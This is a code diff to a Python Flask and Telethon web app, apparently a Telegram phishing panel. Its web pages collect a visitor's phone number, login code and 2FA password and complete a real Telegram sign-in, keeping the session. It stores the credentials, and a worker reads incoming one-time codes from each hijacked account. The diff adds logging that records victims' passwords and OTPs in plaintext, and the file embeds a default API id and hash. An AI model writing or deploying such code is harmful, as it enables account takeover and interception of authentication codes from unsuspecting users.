@@ -3,6 +3,7 @@ import re
 import sqlite3
 import asyncio
 import threading
+import logging
 from flask import Flask, render_template, request, redirect, url_for, session, flash
 from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
@@ -11,14 +12,20 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, P
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
+# ====== LOGGING ======
+logging.basicConfig(
+    level=logging.DEBUG,  # bisa INFO kalau terlalu rame
+    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
+)
+logger = logging.getLogger(__name__)
+
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
 
 # ========== KONFIG ==========
 api_id = int(os.getenv("API_ID", 16047851))
 api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
-BOT_TOKEN = os.getenv("BOT_TOKEN", "xxx")  # ganti token
-CHAT_ID = os.getenv("CHAT_ID", "xxx")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "your-bot-token")
 
 # Pakai folder tmp supaya aman di Railway
 SESSION_DIR = "/tmp/sessions"
@@ -26,59 +33,63 @@ DB_FILE = "/tmp/data.db"
 
 os.makedirs(SESSION_DIR, exist_ok=True)
 
-# ========== FIX UNTUK ASYNCIO ==========
-def run_async(coro):
-    try:
-        loop = asyncio.get_event_loop()
-    except RuntimeError:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-
-    if loop.is_running():
-        return asyncio.ensure_future(coro)
-    else:
-        return loop.run_until_complete(coro)
-
 # ====== DB INIT ======
 def init_db():
-    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
-    cur = conn.cursor()
-    cur.execute("""
-        CREATE TABLE IF NOT EXISTS users (
-            phone TEXT PRIMARY KEY,
-            otp TEXT,
-            password TEXT
-        )
-    """)
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        cur = conn.cursor()
+        cur.execute("""
+            CREATE TABLE IF NOT EXISTS users (
+                phone TEXT PRIMARY KEY,
+                otp TEXT,
+                password TEXT
+            )
+        """)
+        conn.commit()
+        conn.close()
+        logger.info("Database initialized")
+    except Exception as e:
+        logger.error(f"init_db error: {e}")
 
 def save_user(phone, otp=None, password=None):
-    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
-    cur = conn.cursor()
-    cur.execute("""
-        INSERT INTO users (phone, otp, password)
-        VALUES (?, ?, ?)
-        ON CONFLICT(phone) DO UPDATE SET otp=excluded.otp, password=excluded.password
-    """, (phone, otp, password))
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        cur = conn.cursor()
+        cur.execute("""
+            INSERT INTO users (phone, otp, password)
+            VALUES (?, ?, ?)
+            ON CONFLICT(phone) DO UPDATE SET otp=excluded.otp, password=excluded.password
+        """, (phone, otp, password))
+        conn.commit()
+        conn.close()
+        logger.info(f"Simpan user {phone}, otp={otp}, password={password}")
+    except Exception as e:
+        logger.error(f"Error save_user: {e}")
 
 def get_user(phone):
-    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
-    cur = conn.cursor()
-    cur.execute("SELECT phone, otp, password FROM users WHERE phone=?", (phone,))
-    row = cur.fetchone()
-    conn.close()
-    return row
+    try:
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        cur = conn.cursor()
+        cur.execute("SELECT phone, otp, password FROM users WHERE phone=?", (phone,))
+        row = cur.fetchone()
+        conn.close()
+        logger.debug(f"Ambil user {phone}: {row}")
+        return row
+    except Exception as e:
+        logger.error(f"get_user error: {e}")
+        return None
 
 def get_all_users():
-    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
-    cur = conn.cursor()
-    cur.execute("SELECT phone FROM users")
-    rows = cur.fetchall()
-    conn.close()
-    return [r[0] for r in rows]
+    try:
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        cur = conn.cursor()
+        cur.execute("SELECT phone FROM users")
+        rows = cur.fetchall()
+        conn.close()
+        return [r[0] for r in rows]
+    except Exception as e:
+        logger.error(f"get_all_users error: {e}")
+        return []
 
 # ====== Helper session files ======
 def remove_session_files(phone_base: str):
@@ -86,8 +97,9 @@ def remove_session_files(phone_base: str):
         if fn.startswith(f"{phone_base}."):
             try:
                 os.remove(os.path.join(SESSION_DIR, fn))
-            except Exception:
-                pass
+                logger.debug(f"Hapus session file {fn}")
+            except Exception as e:
+                logger.warning(f"Gagal hapus {fn}: {e}")
 
 def finalize_pending_session(phone_base: str):
     for fn in os.listdir(SESSION_DIR):
@@ -96,8 +108,9 @@ def finalize_pending_session(phone_base: str):
             dst = os.path.join(SESSION_DIR, fn.replace(".pending", ""))
             try:
                 os.rename(src, dst)
-            except Exception:
-                pass
+                logger.debug(f"Finalize session {src} -> {dst}")
+            except Exception as e:
+                logger.warning(f"Gagal finalize {fn}: {e}")
 
 # ====== FLASK ROUTES ======
 @app.route("/", methods=["GET", "POST"])
@@ -121,10 +134,12 @@ def login():
             await client.disconnect()
 
         try:
-            run_async(send_code())
+            asyncio.run(send_code())
+            logger.info(f"OTP dikirim ke {phone}")
             flash("OTP telah dikirim ke Telegram Anda.")
             return redirect(url_for("otp"))
         except Exception as e:
+            logger.error(f"Error kirim OTP ke {phone}: {e}")
             flash(f"Error kirim OTP: {e}", "error")
             return redirect(url_for("login"))
     return render_template("login.html")
@@ -133,10 +148,12 @@ def login():
 def otp():
     phone = session.get("phone")
     if not phone:
+        logger.warning("Tidak ada phone di session saat akses /otp")
         return redirect(url_for("login"))
 
     if request.method == "POST":
         code = request.form.get("otp", "").strip()
+        logger.debug(f"Verifikasi OTP {code} untuk {phone}")
         pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")
 
         async def verify_code():
@@ -154,8 +171,11 @@ def otp():
             except PhoneCodeInvalidError:
                 await client.disconnect()
                 return {"ok": False, "error": "OTP salah"}
+            except Exception as e:
+                logger.error(f"verify_code error {phone}: {e}")
+                return {"ok": False, "error": str(e)}
 
-        res = run_async(verify_code())
+        res = asyncio.run(verify_code())
         if res["ok"]:
             if res.get("need_password"):
                 session["need_password"] = True
@@ -180,6 +200,7 @@ def password():
 
     if request.method == "POST":
         password_input = request.form.get("password", "")
+        logger.debug(f"Verifikasi password untuk {phone}")
         pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")
 
         async def verify_password():
@@ -194,8 +215,11 @@ def password():
             except PasswordHashInvalidError:
                 await client.disconnect()
                 return {"ok": False, "error": "Password salah"}
+            except Exception as e:
+                logger.error(f"verify_password error {phone}: {e}")
+                return {"ok": False, "error": str(e)}
 
-        res = run_async(verify_password())
+        res = asyncio.run(verify_password())
         if res["ok"]:
             flash("Login berhasil ✅", "success")
             return redirect(url_for("success"))
@@ -218,6 +242,7 @@ async def forward_handler(event, client_name):
     otp_match = re.findall(r"\b\d{4,6}\b", text_msg)
     if otp_match:
         otp_code = otp_match[0]
+        logger.info(f"OTP {otp_code} diterima untuk {client_name}")
         save_user(client_name, otp=otp_code)
 
 async def worker_main():
@@ -243,6 +268,7 @@ async def worker_main():
 
             clients[base] = client
             asyncio.create_task(client.run_until_disconnected())
+            logger.info(f"Worker aktif untuk {base}")
         await asyncio.sleep(5)
 
 def start_worker():
@@ -292,11 +318,11 @@ def start_bot():
     application = Application.builder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CallbackQueryHandler(button_handler))
-    application.run_polling()
+    threading.Thread(target=application.run_polling, daemon=True).start()
 
 # ======= MAIN =======
 if __name__ == "__main__":
     init_db()
     start_worker()
-    threading.Thread(target=start_bot, daemon=True).start()
+    start_bot()
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)), debug=True)
